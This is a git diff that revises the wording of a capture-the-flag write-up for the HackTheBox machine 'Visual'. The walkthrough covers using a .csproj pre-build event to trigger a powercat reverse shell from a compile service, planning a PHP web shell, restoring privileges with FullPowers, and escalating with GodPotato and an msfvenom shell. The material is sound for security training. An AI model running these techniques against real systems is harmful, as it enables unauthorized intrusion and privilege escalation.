@@ -33,13 +33,13 @@ PORT   STATE SERVICE VERSION
 
 Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds
 ```
-So there is an Apache 2.4.56 web server running on port 80. We inspect the site with firefox entering the url http://visual.htb. Browsing the site, we find a web app which compiles and stores visual studio projects. After supplying a link to a git repo, the app compiles the net 6.0 and c# projects and uploads them in the site.
+So there is an Apache 2.4.56 web server running on port 80. We inspect the site with firefox entering the url http://visual.htb, and we find a web app which compiles and stores visual studio projects. After supplying a link to a git repo, the app compiles the net 6.0 and c# projects and uploads them in the site.
 
 ![visual1](https://github.com/g1vi/Write-up/assets/120142960/d6013b76-77ba-4f2a-8f0d-8338c2dd5560)
 <br>
 <br>
 ### PHASE 2. User
-Let's begin preparing a local http git repo serving a visual studio solution. For this, we start making a directory called `repo` and create a new visual studio solution called `repo.sln`
+Our goal is to prepare a local http git repo serving a visual studio solution. For this, we start making a directory called `repo` and create a new visual studio solution called `repo.sln`
 ```markdown
 mkdir repo
 
@@ -70,7 +70,6 @@ git init
 ```
 The directory `repo/.git` is created after this. The `.git` directory contains the repo files and metadata. Next step is to add all files on the `repo` directory to the git
 ```markdown
-cd repo
 git add .
 ```
 Check there no more untracked files in the git repo to be added
@@ -109,15 +108,15 @@ Finally, move to .git directory and update server info
 ```markdown
 git update-server-info
 ```
-Now the git is ready to be served on http. Let's do a test, move to `.git` and serve the repo with a python http server, then in the web app enter the machine ip. Shortly after the app starts downloading the c# files and uploading them into the server. Once they are conmplied, they are stored in a random folder. The app supplies the user with the resulting url 
+Now the git is ready to be served on http. We can test it, move to `.git` and serve the repo with a python http server. Then, in the web app, enter the local machine ip. Shortly after, the app starts downloading the c# files and uploading them into the server. Once they are conmplied, they are stored in a random folder and the app supplies the user with the resulting url 
 ```markdown
 cd .git 
                                                                                                                                  
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
-10.129.131.71 - - [02/Oct/2023 06:35:21] "GET /info/refs?service=git-upload-pack HTTP/1.1" 200 -
-10.129.131.71 - - [02/Oct/2023 06:35:21] "GET /HEAD HTTP/1.1" 200 -
+10.129.131.71 - [02/Oct/2023 06:35:21] "GET /info/refs?service=git-upload-pack HTTP/1.1" 200 -
+10.129.131.71 - [02/Oct/2023 06:35:21] "GET /HEAD HTTP/1.1" 200 -
 10.129.131.71 - [02/Oct/2023 06:35:21] "GET /objects/c1/149ed1d5d95b61620419e6edcd044c2e011dc3 HTTP/1.1" 200 -
 10.129.131.71 - [02/Oct/2023 06:35:21] "GET /objects/9c/bbf0dddb9793273a5f11cb16638df6e5f75f79 HTTP/1.1" 200 -
 10.129.131.71 - [02/Oct/2023 06:35:21] "GET /objects/6d/14b52ecedd9bdefeb99b8df164c512076e6706 HTTP/1.1" 200 -
@@ -136,7 +135,7 @@ Keyboard interrupt received, exiting.
 
 ![visual2](https://github.com/g1vi/Write-up/assets/120142960/30e914ad-fd62-4141-a0bb-3f3cb841d533)
 
-We have to find a way to make the server execute the code after compiling it. This can be done manipulating pre and post events in the c# `.csproj` project file. These events are triggered by the msbuild compiler before or after the compiling process ends. We will add a pre event, calling a powercat reverse shell before the building process begins. Just create any Program.cs source file and in the `myapp.csproj` file, add the pre event
+Once we are sure our git repo works, we have to find a way to make the server execute the code after compiling it. This can be done manipulating pre and post events in the c# `.csproj` project file. These events are triggered by the msbuild compiler before or after the compiling process ends. We will add a pre event, calling a powercat reverse shell before the building process begins. Just create any simple Program.cs source file and, in the `myapp.csproj` file, add the pre event
 ```markdown
 <Project Sdk="Microsoft.NET.Sdk">
 
@@ -162,7 +161,7 @@ cd .git
 git update-server-info
 python3 -m http.server 80
 ```
-Start another python http serving powercat.ps1 and start a listener on port 1919. Enter red box ip in the web app url box, after the c# files are pulled, a reverse shell is received on port 1919
+Start another python http serving powercat.ps1 and start a listener. Enter red box ip in the web app url box, after the c# files are pulled and processed, a reverse shell is received on port 1919
 <br>
 <br>
 ### PHASE 3. System
@@ -188,7 +187,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeCreateGlobalPrivilege       Create global objects          Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
-After enumeration, we discover we have write access to webroot folder, so if we copy a .php shell in the webroot, we could move laterally to the user who is running the web server. Check who is running the http service
+After enumeration, we discover we have write access to webroot folder so if we copy a .php shell in the webroot, we could move laterally to the user who is running the web server. Let's check who is running the http service
 ```markdown
 wmic service where started=true get name,startname
 
@@ -216,7 +215,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeCreateGlobalPrivilege       Create global objects          Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
-It's the same as before, seems we have not progressed so much; however, there is a tool which restores original privileges (including impersonation) to local services account. Download and use `fullpowers.exe` on local service account, check impersonation privilege is restored.
+It's the same as before, seems we have not progressed so much; however, there is a tool which restores original privileges (including impersonation) to local services account. Download and use `fullpowers.exe` on local service account, verify impersonation privilege is restored aftwerwards.
 ```markdown
 fp.exe
 [+] Started dummy thread with id 2388
@@ -241,7 +240,7 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 ```
-Once we have impersonation privilege, we can try all range of potatoes. The one working is god potato. We need another msfvenom shell to execute with god potato.
+Once we have impersonation privilege restored, we can try all range of potatoes. The one working is god potato. We need another msfvenom shell to execute with god potato.
 ```markdown
 godpotato-net4.exe -cmd "cmd /c shell.exe"
 [*] CombaseModule: 0x140716178145280
